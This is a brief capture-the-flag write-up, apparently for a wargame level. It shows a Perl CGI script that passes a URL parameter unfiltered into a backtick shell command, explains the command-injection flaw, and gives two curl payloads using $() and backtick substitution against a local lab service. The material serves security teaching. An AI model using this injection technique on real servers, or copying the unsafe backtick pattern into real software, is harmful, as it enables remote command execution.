# Level 04

## 💡 Tips
- CGI parameters can be manipulated through the URL
- In Perl, the backtick (\`) operator executes shell commands
- `$()` syntax can be used for command substitution

## Analysis

### Perl CGI Script
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Vulnerability Explanation
1. Script takes 'x' parameter from URL
2. Parameter value is executed with `echo` command without any filtering
3. Vulnerable to shell command injection
4. Output is directly returned to user

## ⚔️ Attack Method

### Command Injection
```bash
curl 'localhost:4747/?x=$(getflag)'
```

### Alternative Method
```bash
curl 'localhost:4747/?x=`getflag`'
```